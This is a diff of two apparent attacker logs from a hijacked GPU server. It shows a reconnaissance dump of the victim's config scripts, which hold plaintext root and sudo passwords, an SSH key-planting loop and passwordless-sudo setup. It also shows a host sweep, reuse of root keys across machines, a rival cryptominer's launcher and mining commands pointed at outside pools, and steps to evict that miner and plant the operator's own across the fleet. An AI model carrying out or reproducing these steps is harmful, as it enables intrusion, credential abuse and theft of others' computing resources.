@@ -1,282 +1,102 @@
 Warning: Permanently added '123.184.7.135' (ED25519) to the list of known hosts.
-### FARM-INTEL 2026-11-24T19:14:48Z
---- /root/conf/hostlist
-g0002
-g0003
-g0004
-g0005
-g0006
-g0007
-g0008
---- /root/conf/hosts
-127.0.0.1 localhost
-127.0.1.1 ubuntu
-
-# The following lines are desirable for IPv6 capable hosts
-::1     ip6-localhost ip6-loopback
-fe00::0 ip6-localnet
-ff00::0 ip6-mcastprefix
-ff02::1 ip6-allnodes
-ff02::2 ip6-allrouters
-
-172.16.11.13	g0003
-172.16.11.14	g0004
-172.16.11.15	g0005
-172.16.11.16	g0006
-172.16.11.17	g0007
-172.16.11.18	g0008
-#gitHub Start
-140.82.121.3 github.com
-140.82.121.3 gist.github.com
-185.199.110.153 assets-cdn.github.com
-185.199.108.133 raw.githubusercontent.com
-185.199.111.133 gist.githubusercontent.com
-185.199.110.133 cloud.githubusercontent.com
-185.199.111.133 camo.githubusercontent.com
-185.199.111.133 avatars0.githubusercontent.com
---- /root/conf/ssh_config
-
-# This is the ssh client system-wide configuration file.  See
-# ssh_config(5) for more information.  This file provides defaults for
-# users, and the values can be changed in per-user configuration files
-# or on the command line.
-
-# Configuration data is parsed as follows:
-#  1. command line options
-#  2. user-specific file
-#  3. system-wide file
-# Any configuration value is only changed the first time it is set.
-# Thus, host-specific definitions should be at the beginning of the
-# configuration file, and defaults at the end.
-
-# Site-wide defaults for some commonly used options.  For a comprehensive
-# list of available options, their meanings and defaults, please see the
-# ssh_config(5) man page.
-
-Include /etc/ssh/ssh_config.d/*.conf
-
-Host *
-#   ForwardAgent no
-#   ForwardX11 no
-#   ForwardX11Trusted yes
-#   PasswordAuthentication yes
---- /root/conf/pass.sh
+### SEIZE 2026-11-24T19:18:08Z
+### KRIG-SOURCE
+4030205       1 root     /bin/bash /opt/plh/run_gpu.sh 0
+4030209       1 root     /bin/bash /opt/plh/run_gpu.sh 1
+4030213       1 root     /bin/bash /opt/plh/run_gpu.sh 2
+4030217       1 root     /bin/bash /opt/plh/run_gpu.sh 3
+4030221       1 root     /bin/bash /opt/plh/run_gpu.sh 4
+4030225       1 root     /bin/bash /opt/plh/run_gpu.sh 5
+4030229       1 root     /bin/bash /opt/plh/run_gpu.sh 6
+4030233       1 root     /bin/bash /opt/plh/run_gpu.sh 7
+4030237 4030205 root     ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g0 --password x -d 0 --api-port 1260
+4030238 4030209 root     ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g1 --password x -d 1 --api-port 1261
+4030239 4030213 root     ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g2 --password x -d 2 --api-port 1262
+4030243 4030217 root     ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g3 --password x -d 3 --api-port 1263
+4030248 4030221 root     ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g4 --password x -d 4 --api-port 1264
+4030251 4030225 root     ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g5 --password x -d 5 --api-port 1265
+4030254 4030229 root     ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g6 --password x -d 6 --api-port 1266
+4030257 4030233 root     ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g7 --password x -d 7 --api-port 1267
+krig pid=4030237 ppid=4030205 cmd=/bin/bash /opt/plh/run_gpu.sh 0 
+   grandparent=1 cmd=/lib/systemd/systemd nopti nospectre_v2 nospec_store_bypass_disable --system --deserialize 67 
+lrwxrwxrwx 1 root root 0 Nov 25 03:18 /proc/4030237/cwd -> /opt/arsenal/miners/krig
+krig pid=4030238 ppid=4030209 cmd=/bin/bash /opt/plh/run_gpu.sh 1 
+   grandparent=1 cmd=/lib/systemd/systemd nopti nospectre_v2 nospec_store_bypass_disable --system --deserialize 67 
+lrwxrwxrwx 1 root root 0 Nov 25 03:18 /proc/4030238/cwd -> /opt/arsenal/miners/krig
+krig pid=4030239 ppid=4030213 cmd=/bin/bash /opt/plh/run_gpu.sh 2 
+   grandparent=1 cmd=/lib/systemd/systemd nopti nospectre_v2 nospec_store_bypass_disable --system --deserialize 67 
+lrwxrwxrwx 1 root root 0 Nov 25 03:18 /proc/4030239/cwd -> /opt/arsenal/miners/krig
+### TIMERS
+NEXT                        LEFT               LAST                        PASSED             UNIT                           ACTIVATES
+Wed 2026-11-25 06:01:56 CST 2h 43min left      Tue 2026-11-24 06:41:41 CST 20h ago            apt-daily-upgrade.timer        apt-daily-upgrade.service
+Wed 2026-11-25 09:35:23 CST 6h left            Wed 2026-11-25 03:06:21 CST 11min ago          ua-timer.timer                 ua-timer.service
+Wed 2026-11-25 11:45:13 CST 8h left            Tue 2026-11-24 11:45:14 CST 15h ago            update-notifier-download.timer update-notifier-download.service
+Wed 2026-11-25 12:10:15 CST 8h left            Tue 2026-11-24 18:28:51 CST 8h ago             fwupd-refresh.timer            fwupd-refresh.service
+Wed 2026-11-25 12:12:14 CST 8h left            Tue 2026-11-24 12:12:14 CST 15h ago            systemd-tmpfiles-clean.timer   systemd-tmpfiles-clean.service
+Wed 2026-11-25 14:41:03 CST 11h left           Tue 2026-11-24 20:31:36 CST 6h ago             apt-daily.timer                apt-daily.service
+Wed 2026-11-25 16:17:42 CST 12h left           Wed 2026-11-25 00:49:10 CST 2h 28min ago       motd-news.timer                motd-news.service
+Thu 2026-11-26 00:00:00 CST 20h left           Wed 2026-11-25 00:00:00 CST 3h 18min ago       dpkg-db-backup.timer           dpkg-db-backup.service
+Thu 2026-11-26 00:00:00 CST 20h left           Wed 2026-11-25 00:00:00 CST 3h 18min ago       logrotate.timer                logrotate.service
+Thu 2026-11-26 04:20:23 CST 1 day 1h left      Wed 2026-11-25 02:29:42 CST 48min ago          man-db.timer                   man-db.service
+Thu 2026-11-26 04:48:21 CST 1 day 1h left      Wed 2026-11-25 00:49:01 CST 2h 29min ago       mdcheck_continue.timer         mdcheck_continue.service
+Thu 2026-11-26 23:00:46 CST 1 day 19h left     Wed 2026-11-25 02:54:15 CST 23min ago          mdmonitor-oneshot.timer        mdmonitor-oneshot.service
+Sun 2026-11-29 03:10:07 CST 3 days left        Sun 2026-11-22 03:10:22 CST 3 days ago         e2scrub_all.timer              e2scrub_all.service
+Mon 2026-11-30 01:30:54 CST 4 days left        Mon 2026-11-23 00:33:23 CST 2 days ago         fstrim.timer                   fstrim.service
+/etc/cron.d/plh-keepalive
+/etc/systemd/system/plh-card@.service
+/var/spool/cron/crontabs/root
+/opt/plh/keepalive.sh
+/opt/plh/evidence_cron.txt
+/opt/plh/run_gpu.sh
+/opt/plh/log/k5.log
+/opt/plh/log/k6.log
+/opt/plh/log/k4.log
+/opt/plh/log/k0.log
+/opt/plh/log/k3.log
+/opt/plh/log/k2.log
+/opt/plh/log/k7.log
+/opt/plh/log/k1.log
+/opt/plh/krig_test_g0.log
+/opt/plh/foreign_evict/watch.sh.bak
+/opt/t19/krig/mine-pearl.sh
+/opt/t19/krig/krig-miner
+/opt/t19/www/i6425_p2.txt
+/opt/t19/www/up/ps.txt
+### PLH-RUNGPU
 #!/bin/bash
-
-PASSWORD="Admin@123_para#!2024"
-
-for i in {1..16}
-do
-  HOST="g$(printf "%04d" $i)"
-  echo "Setting root password on $HOST"
-  ssh root@$HOST "echo root:$PASSWORD | chpasswd"
-done
---- /root/conf/mianmi.txt
-#对于非root账号，且有sudo权限的适用。
-for i in g0047 g0048 g0049; do ssh $i 'echo $HOSTNAME; sudo su - ubuntu -c "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCblZcdjQO0mnWs7oZZdzlNAQHD8ens10xt8ZpXTDCwIOJrf/fzy/mfLwojGY4jDm1P3euqPD2/niTKlvjSaL+L2HsVhoKzH4TQgjQmH3SgGqaHvhOs4wzHl8PYDNh9PJ1oy3y8c5JJHPF3maaJEVSXUVHCCr3Aw0z/NKhuf+x257QGppIqYV/Z45zK9VWt+oZOessH9rNHVHxQrdkMs0KgyVtzC331I+2DNaACwCD0SHiiTdUeqpB3rrjBKSPdBRkQOwDDqkltE55D/d74KjlCnU0TcsClFeQ8QOlkpm+z3f5aggES+Kdc04J+ImA6wGYJbVDTvnAzybDP5R5Th3SUd1hRt41BpMSU6tTYhGgKTYTQQJGNn46mAwiYUjUgrRuArPT4V3XPXidhGmAml57nGysPFyPdPlV2uGWs+wJmiNwfpgpzdfUM8EVL4Twzb+nr3gAZhOzrdS3qQ/Uo+t4PCVH6uXHo1wHrbJJp+GPDfVp9zSANt7+pj4b6oJqJkAc= langboat@m005\" >> ~/.ssh/authorized_keys" '; done--- /root/conf/ssh.sh
-#!/bin/bash
-  
-# 获取当前脚本的绝对路径
-conf_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-
-# 获取原始调用用户
-original_user="${SUDO_USER:-$USER}"
-
-# 检查原始调用用户是否为 root
-if [ "$original_user" = "root" ]; then
-    # 原始调用用户是 root
-    echo "user name: root"
-    cp "${conf_dir}/root_rsa/sshd_config" /etc/ssh/
-    cp "${conf_dir}/root_rsa/ssh_config" /etc/ssh/
-else
-    # 原始调用用户不是 root
-    echo "user name: $original_user"
-    cp "${conf_dir}/ubuntu_rsa/sshd_config" /etc/ssh/
-    cp "${conf_dir}/ubuntu_rsa/ssh_config" /etc/ssh/
-fi
-
-# 重启 sshd 服务
-systemctl restart sshd
---- /root/conf/para_ssh.sh
-#连续的写法
-#seq 107 125 | xargs -I{} -P 10 ssh para@10.251.10.{} "echo \$HOSTNAME && sudo ~/NVIDIA-Linux-x86_64-550.90.07.run --dkms -s;sudo update-initramfs -k $(uname -r) -c;sudo cp ~/conf/nv_gpu_conf.sh /usr/local/bin/;sudo /usr/local/bin/nv_gpu_conf.sh >/tmp/nv_gpu_conf.log 2>&1;sudo modprobe nvidia_peermem"
-#离散的写法
-#printf "2\n4\n7\n8\n88" | xargs -I{} -P5 ssh ubuntu@172.16.21.{} "echo \$HOSTNAME && ~/conf/grub.sh;sudo ~/conf/disableupdate.sh; sudo ~/conf/disablenouveau.sh; sudo ~/conf/cpu_performance.sh; ~/conf/install_build_essential.sh; sudo ~/conf/installpackage.sh"
-seq 6 70 | awk '$1 != 13 && $1 != 67' | \
-xargs -I{} -P20 sh -c '
-  ip={}
-  host="10.242.32.$ip"
-  if timeout 15 ssh -o ConnectTimeout=10 -o StrictHostKeyChecking=no root@$host "echo \$HOSTNAME && /root/conf/ids.sh" 2>/dev/null; then
-    echo "✅ Success: $host"
-  else
-    echo "$ip" | flock /tmp/unreachable.lock tee -a /tmp/unreachable.txt >/dev/null
-    echo "❌ Failed: $host"
-  fi
-'
-
---- /root/conf/ssh-ssh.sh
-#!/bin/bash
-
-# 定义节点范围
-START_NODE=1
-END_NODE=125
-
-# 格式化节点名称
-NODES=$(seq -f "node%03g" $START_NODE $END_NODE)
-
-# 输出测试结果的文件
-RESULT_FILE="ssh_test_results.log"
-> $RESULT_FILE  # 清空旧结果
-
-# 开始测试
-echo "开始测试节点之间的 SSH 连通性..."
-for NODE_A in $NODES; do
-    for NODE_B in $NODES; do
-        if [ "$NODE_A" != "$NODE_B" ]; then
-            # 测试 SSH 连通性
-            ssh -o BatchMode=yes -o ConnectTimeout=5 $NODE_A "ssh -o BatchMode=yes -o ConnectTimeout=5 $NODE_B 'echo SUCCESS'" &> /dev/null
-            if [ $? -eq 0 ]; then
-                echo "$NODE_A -> $NODE_B: SUCCESS" >> $RESULT_FILE
-            else
-                echo "$NODE_A -> $NODE_B: FAILED" >> $RESULT_FILE
-            fi
---- /root/conf/root_copy_id_rsa.sh
-#!/bin/bash
-#apt update -y
-#apt-get install expect -y
-#apt install python3 python3-pip -y
-#pip3 install spawn
-# 定义目标主机信息
-declare -a hosts=(
-  "10.80.80.12"
-  "10.80.80.13"
-  "10.80.80.14"
-)
-
-# SSH密码
-PASSWORD="Bingxing.2026"
-
-# 拷贝 .ssh 目录到每个目标主机
-for ip in "${hosts[@]}"; do
-  echo "正在拷贝 .ssh 目录到 $ip"
-  
-  expect << EOF
-set timeout 20
-spawn scp -r /root/.ssh root@$ip:/root
-expect {
-  "yes/no" { send "yes\r"; exp_continue }
-  "password:" { send "$PASSWORD\r" }
---- /root/conf/keygen.sh
-#!/bin/bash
-
-USERNAME=$1
-USER_HOME="/home/$USERNAME"
-ssh-keygen -t rsa -N '' -f $USER_HOME/.ssh/id_rsa
-cat $USER_HOME/.ssh/id_rsa.pub >> $USER_HOME/.ssh/authorized_keys
-
-# 添加环境变量到 .bashrc 文件
-echo 'source /usr/share/modules/init/profile.sh' >> $USER_HOME/.bashrc
-source $USER_HOME/.bashrc
---- /root/conf/set_sudonopasswd.sh
-#!/bin/bash
-apt-get install expect
-apt install python3 python3-pip
-pip3 install spawn
-# 定义目标主机列表
-declare -a hosts=(
-  10.102.2.161 10.102.2.162 10.102.2.163 10.102.2.164 10.102.2.164 10.102.2.165
-  10.102.2.166 10.102.2.167 10.102.2.168 10.102.2.169 10.102.2.170 10.102.2.171
-  10.102.2.172 10.102.2.173 10.102.2.174 10.102.2.175 10.102.2.176 10.102.2.177
-  10.102.2.178 10.102.2.179 10.102.2.180
-)
-
-# sudo密码
-SUDO_PASSWORD="Kgzs@2024"
-
-# 使用更安全的/etc/sudoers.d/方式
-SUDOERS_LINE="kgzs ALL=(ALL:ALL) NOPASSWD: ALL"
-
-for ip in "${hosts[@]}"; do
-  echo "正在处理主机: $ip"
-  
-  expect << EOF
-    set timeout 15
-    # 强制分配伪终端 (-t)
-    spawn ssh -t kgzs@$ip "sudo bash -c 'echo \"$SUDOERS_LINE\" | sudo tee /etc/sudoers.d/kgzs-nopasswd && sudo chmod 440 /etc/sudoers.d/kgzs-nopasswd'"
---- /root/conf/synchosts.sh
-#!/bin/bash
-
-cp /data/apps/conf/hosts /etc/
-### KEY-FINGERPRINTS
-/root/conf/root_rsa:
-total 16
-drwxr-xr-x  2 root root 4096 Apr 18  2026 .
-drwxr-xr-x 10 root root 4096 Apr 18  2026 ..
--rw-r--r--  1 root root 1600 Apr 18  2026 ssh_config
--rw-r--r--  1 root root 3227 Apr 18  2026 sshd_config
-
-/root/conf/ssh_rsa:
-total 16
-drwxr-xr-x  2 root root 4096 Apr 18  2026 .
-drwxr-xr-x 10 root root 4096 Apr 18  2026 ..
--rw-r--r--  1 root root 1600 Apr 18  2026 ssh_config
--rw-r--r--  1 root root 3299 Apr 18  2026 sshd_config
-
-/root/conf/ubuntu_rsa:
-total 20
-drwxr-xr-x  3 root root 4096 Apr 18  2026 .
-drwxr-xr-x 10 root root 4096 Apr 18  2026 ..
-drwxr-xr-x  2 root root 4096 Apr 18  2026 orig
--rw-r--r--  1 root root 1600 Apr 18  2026 ssh_config
--rw-r--r--  1 root root 3514 Apr 18  2026 sshd_config
-/root/conf/root_rsa/ssh_config -> notakey
-/root/conf/root_rsa/sshd_config -> notakey
-/root/conf/ssh_rsa/ssh_config -> notakey
-/root/conf/ssh_rsa/sshd_config -> notakey
-/root/conf/ubuntu_rsa/ssh_config -> notakey
-/root/conf/ubuntu_rsa/sshd_config -> notakey
-/root/.ssh/id_rsa -> SHA256:tn2N+uRagAuM0t3vwsZNGFwY1OJcX2Ec36EIzBKV0ns (RSA)
-### SWEEP22
-11.9.141.130
-11.9.141.146
-11.9.141.162
-11.9.141.178
-11.9.141.194
-11.9.141.210
-11.9.141.226
-11.9.141.242
-192.168.0.20
-192.168.0.21
-192.168.0.22
-192.168.0.23
-192.168.0.28
-192.168.0.30
-192.168.0.31
-15
-### KEY-LADDER
-11.9.141.130 root /root/.ssh/id_rsa
-### PER-HOST
-########## 11.9.141.130 (root)
-Warning: Permanently added '11.9.141.130' (ED25519) to the list of known hosts.
-g0023
-8
-0, NVIDIA A800-SXM4-80GB, 6327 MiB, 100 %
-1, NVIDIA A800-SXM4-80GB, 6327 MiB, 100 %
-2, NVIDIA A800-SXM4-80GB, 6327 MiB, 100 %
-3, NVIDIA A800-SXM4-80GB, 6327 MiB, 100 %
-4, NVIDIA A800-SXM4-80GB, 6327 MiB, 100 %
-5, NVIDIA A800-SXM4-80GB, 6327 MiB, 100 %
-6, NVIDIA A800-SXM4-80GB, 6327 MiB, 100 %
-7, NVIDIA A800-SXM4-80GB, 6327 MiB, 100 %
-./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g0 --password x -d 0 --api-port 1260
-./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g1 --password x -d 1 --api-port 1261
-./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g2 --password x -d 2 --api-port 1262
-Warning: Permanently added '11.9.141.130' (ED25519) to the list of known hosts.
-gpus=8
-4030237 ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g0 --password x -d 0 --api-port 1260
-4030238 ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g1 --password x -d 1 --api-port 1261
-4030239 ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g2 --password x -d 2 --api-port 1262
-4030243 ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g3 --password x -d 3 --api-port 1263
-4030248 ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g4 --password x -d 4 --api-port 1264
-already-ours
-### DONE-FARM
+i="${1:?card index required}"
+W=prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l
+K=/opt/arsenal/miners/krig
+L=/opt/plh/log
+WN=plh-123-184-7-135-g$i
+mkdir -p "$L"
+pgrep -f "krig-miner.*$WN" >/dev/null 2>&1 && exit 0
+cd "$K" || exit 1
+setsid ./krig-miner --coin pearl \
+  --url stratum+ssl://prl-sg.kryptex.network:8048 \
+  --url stratum+tcp://pool.pearlhash.xyz:9000 \
+  --url stratum+ssl://pearl-sg1.luckypool.io:3360 \
+  --user "$W/$WN" --password x -d "$i" --api-port 126$i >> "$L/k$i.log" 2>&1 &
+KR=$!
+echo "$KR" > "/run/plh-g$i.pid"
+wait "$KR"
+### NEUTRALIZE
+moved run_gpu.sh
+cleaned cron /etc/cron.d/plh-keepalive
+cleaned cron /var/spool/cron/crontabs/root
+### OUR-UNITS
+ulx-g0=failed ulx-g1=failed ulx-g2=failed ulx-g3=failed ulx-g4=failed ulx-g5=failed ulx-g6=failed ulx-g7=failed 
+inactive
+### FLEET-172.16.11 (root password from /root/conf/pass.sh)
+### FLEET-PLANT (max 5 new nodes)
+### FINAL
+0, 0 MiB, 0 %
+1, 0 MiB, 0 %
+2, 0 MiB, 0 %
+3, 0 MiB, 0 %
+4, 0 MiB, 0 %
+5, 0 MiB, 0 %
+6, 0 MiB, 0 %
+7, 0 MiB, 0 %
+0
+### DONE-SEIZE
